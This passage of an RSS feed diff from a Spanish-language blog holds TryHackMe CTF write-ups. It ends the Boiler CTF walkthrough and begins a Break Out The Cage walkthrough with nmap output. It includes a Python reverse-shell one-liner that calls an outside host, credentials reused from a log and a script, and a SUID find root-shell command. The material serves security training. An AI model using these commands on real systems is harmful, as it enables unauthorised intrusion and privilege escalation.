+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/boilerctf/Screenshot_20200811_212549.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Hacemos cat al archivo, utilizamos &lt;a href=&#34;https://gchq.github.io/CyberChef&#34;&gt;&lt;strong&gt;CyberChef - Strip HTML tags&lt;/strong&gt;&lt;/a&gt; para leer el html que se muestra y obtener el resultado limpio.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/boilerctf/Screenshot_20200811_212959.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;user---www-databasterd&#34;&gt;USER - WWW-DATA/BASTERD&lt;/h2&gt;
+&lt;p&gt;Encontramos en el archivo un log de acceso del servicio SSH donde se muestra el usuario &lt;code&gt;basterd&lt;/code&gt; y su &amp;ldquo;contraseña&amp;rdquo;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Select HostHPUXLinuxSunOS
+Aug &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; 11:16:26 parrot sshd&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;2443&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;: 
+Server listening on 0.0.0.0 port 22.Aug &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; 11:16:26 parrot sshd&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;2443&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;: 
+Server listening on :: port 22.
+Aug &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; 11:16:35 parrot sshd&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;2451&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;: Accepted password &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; basterd from 10.1.1.1 port &lt;span class=&#34;m&#34;&gt;49824&lt;/span&gt; ssh2 &lt;span class=&#34;c1&#34;&gt;#pass: [... REDACTED ...]&lt;/span&gt;
+Aug &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; 11:16:35 parrot sshd&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;2451&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;: pam_unix&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;sshd:session&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;: session opened &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; user pentest by &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Aug &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; 11:16:36 parrot sshd&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;2466&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;: Received disconnect from 10.10.170.50 port 49824:11: disconnected by user
+Aug &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; 11:16:36 parrot sshd&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;2466&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;: Disconnected from user pentest 10.10.170.50 port &lt;span class=&#34;m&#34;&gt;49824&lt;/span&gt;
+Aug &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; 11:16:36 parrot sshd&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;2451&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;: pam_unix&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;sshd:session&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;: session closed &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; user pentest
+Aug &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; 12:24:38 parrot sshd&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;2443&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;: Received signal 15&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; terminating.
+Select Host FirstSelect Start Date First	
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Ejecutamos una shell inversa y obtenemos una shell con el usuario &lt;code&gt;www-data&lt;/code&gt;.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/boilerctf/Screenshot_20200811_213753.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-SHELL&#34; data-lang=&#34;SHELL&#34;&gt;python -c &lt;span class=&#34;s1&#34;&gt;&amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;10.0.0.1&amp;#34;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;#34;/bin/sh&amp;#34;,&amp;#34;-i&amp;#34;]);&amp;#39;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Además utilizamos la contraseña que encontramos en el servicio SSH y obtenemos una shell con el usuario &lt;code&gt;basterd&lt;/code&gt;.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/boilerctf/Screenshot_20200811_213932.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;user---stoner&#34;&gt;USER - STONER&lt;/h2&gt;
+&lt;p&gt;En la carpeta principal de &lt;code&gt;basterd&lt;/code&gt; encontramos un archivo que realiza una copia a &lt;code&gt;/usr/local/backup&lt;/code&gt; y log en &lt;code&gt;/home/stoner/bck.log&lt;/code&gt; de todo lo que existe en &lt;code&gt;/home/stoner&lt;/code&gt;, además encontramos lo que parece ser una &amp;ldquo;contraseña&amp;rdquo; comentada.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nv&#34;&gt;REMOTE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1.2.3.4
+&lt;span class=&#34;nv&#34;&gt;SOURCE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/home/stoner
+&lt;span class=&#34;nv&#34;&gt;TARGET&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/usr/local/backup
+&lt;span class=&#34;nv&#34;&gt;LOG&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/home/stoner/bck.log 
+&lt;span class=&#34;nv&#34;&gt;DATE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;date +%y&lt;span class=&#34;se&#34;&gt;\.&lt;/span&gt;%m&lt;span class=&#34;se&#34;&gt;\.&lt;/span&gt;%d&lt;span class=&#34;se&#34;&gt;\.&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;
+&lt;span class=&#34;nv&#34;&gt;USER&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;stoner
+&lt;span class=&#34;c1&#34;&gt;#[... REDACTED ...]&lt;/span&gt;
+
+ssh &lt;span class=&#34;nv&#34;&gt;$USER&lt;/span&gt;@&lt;span class=&#34;nv&#34;&gt;$REMOTE&lt;/span&gt; mkdir &lt;span class=&#34;nv&#34;&gt;$TARGET&lt;/span&gt;/&lt;span class=&#34;nv&#34;&gt;$DATE&lt;/span&gt;
+
+&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; -d &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$SOURCE&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;then&lt;/span&gt;
+    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; i in &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;ls &lt;span class=&#34;nv&#34;&gt;$SOURCE&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep &lt;span class=&#34;s1&#34;&gt;&amp;#39;data&amp;#39;&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;do&lt;/span&gt;
+	     &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Begining copy of&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt;  &amp;gt;&amp;gt; &lt;span class=&#34;nv&#34;&gt;$LOG&lt;/span&gt;
+	     scp  &lt;span class=&#34;nv&#34;&gt;$SOURCE&lt;/span&gt;/&lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$USER&lt;/span&gt;@&lt;span class=&#34;nv&#34;&gt;$REMOTE&lt;/span&gt;:&lt;span class=&#34;nv&#34;&gt;$TARGET&lt;/span&gt;/&lt;span class=&#34;nv&#34;&gt;$DATE&lt;/span&gt;
+	     &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;completed&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; &lt;span class=&#34;nv&#34;&gt;$LOG&lt;/span&gt;
+		
+		&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; -n &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;ssh &lt;span class=&#34;nv&#34;&gt;$USER&lt;/span&gt;@&lt;span class=&#34;nv&#34;&gt;$REMOTE&lt;/span&gt; ls &lt;span class=&#34;nv&#34;&gt;$TARGET&lt;/span&gt;/&lt;span class=&#34;nv&#34;&gt;$DATE&lt;/span&gt;/&lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt; 2&amp;gt;/dev/null&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;then&lt;/span&gt;
+		    rm &lt;span class=&#34;nv&#34;&gt;$SOURCE&lt;/span&gt;/&lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt;
+		    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;removed&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; &lt;span class=&#34;nv&#34;&gt;$LOG&lt;/span&gt;
+		    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;####################&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; &lt;span class=&#34;nv&#34;&gt;$LOG&lt;/span&gt;
+				&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;
+					&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Copy not complete&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; &lt;span class=&#34;nv&#34;&gt;$LOG&lt;/span&gt;
+					&lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
+		&lt;span class=&#34;k&#34;&gt;fi&lt;/span&gt; 
+    &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;    
+&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;
+    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Directory is not present&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; &lt;span class=&#34;nv&#34;&gt;$LOG&lt;/span&gt;
+    &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
+&lt;span class=&#34;k&#34;&gt;fi&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Utilizamos la &amp;ldquo;contraseña&amp;rdquo; y logramos obtener una shell con el usuario &lt;code&gt;stoner&lt;/code&gt; y nuestra flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/boilerctf/Screenshot_20200811_214608.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
+&lt;p&gt;Hacemos una pequeña enumeracion con &lt;code&gt;find&lt;/code&gt;  para encontrar archivos con permisos SUID y vemos el comando/archivo &lt;code&gt;find&lt;/code&gt;. Utilizamos &lt;a href=&#34;https://gtfobins.github.io/gtfobins/find/&#34;&gt;&lt;strong&gt;find&lt;/strong&gt;&lt;/a&gt; para obtener una shell root.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;/usr/bin/find . -exec /bin/sh -p &lt;span class=&#34;se&#34;&gt;\;&lt;/span&gt; -quit
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Obtenemos una shell con el usuario &lt;code&gt;root&lt;/code&gt;.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/boilerctf/Screenshot_20200811_220139.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Y nuestra flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/boilerctf/Screenshot_20200811_220219.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+</content:encoded>
+        <dc:creator>sckull</dc:creator>
+        <media:content url="https://sckull.github.io/images/posts/thm/boilerctf/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
+        
+        <media:content url="https://sckull.github.io/images/posts/thm/boilerctf/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
+        
+          
+            
+              <category>ftp</category>
+            
+          
+            
+              <category>vigenere</category>
+            
+          
+            
+              <category>Sar2HTML</category>
+            
+          
+            
+              <category>suid</category>
+            
+          
+        
+        
+          
+            
+              <category>tryhackme</category>
+            
+          
+            
+              <category>linux</category>
+            
+          
+        
+        
+      </item>
+      
+      <item>
+        <title>TryHackMe - Break Out The Cage</title>
+        <link>https://sckull.github.io/posts/breakthecage/</link>
+        <pubDate>Sat, 27 Jun 2020 00:00:00 +0000</pubDate>
+        
+        <atom:modified>Sat, 27 Jun 2020 00:00:00 +0000</atom:modified>
+        <guid>https://sckull.github.io/posts/breakthecage/</guid>
+        <description>Break Out The Cage es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.</description>
+        <content:encoded>&lt;p&gt;Break Out The Cage es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;
+
+
+
+
+  
+
+
+
+  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
+    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/breakthecage/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
+  &lt;/div&gt;
+
+&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Titulo&lt;/th&gt;
+&lt;th&gt;Break Out The Cage&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;Room&lt;/td&gt;
+&lt;td&gt;Break Out The Cage&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Info&lt;/td&gt;
+&lt;td&gt;Help Cage bring back his acting career and investigate the nefarious goings on of his agent!&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Puntos&lt;/td&gt;
+&lt;td&gt;240&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Dificultad&lt;/td&gt;
+&lt;td&gt;Facil&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Maker&lt;/td&gt;
+&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/Magna&#34;&gt;Magna&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
+&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), http (80) y el puerto ssh (22) abiertos.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Sat Jun 27 22:24:17 2020 as: nmap -sV -o nmap_scan_mini breakthecage.thm&lt;/span&gt;
+Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; breakthecage.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.15.25&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.16s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+Not shown: &lt;span class=&#34;m&#34;&gt;997&lt;/span&gt; closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+80/tcp open  http    Apache httpd 2.4.29 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
+Service Info: OSs: Unix, Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;span class=&#34;c1&#34;&gt;# Nmap done at Sat Jun 27 22:25:00 2020 -- 1 IP address (1 host up) scanned in 43.71 seconds&lt;/span&gt;
+
+&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Sat Jun 27 22:24:15 2020 as: nmap -T4 -sV -sC -p- -o nmap_scan breakthecage.thm&lt;/span&gt;
+Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; breakthecage.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.15.25&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.15s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+Not shown: &lt;span class=&#34;m&#34;&gt;65532&lt;/span&gt; closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ftp-anon: Anonymous FTP login allowed &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;FTP code 230&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;             &lt;span class=&#34;m&#34;&gt;396&lt;/span&gt; May &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; 23:33 dad_tasks
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ftp-syst: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   STAT: 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; FTP server status:
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;      Connected to ::ffff:10.8.6.160
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;      Logged in as ftp
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;      TYPE: ASCII
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;      No session bandwidth limit
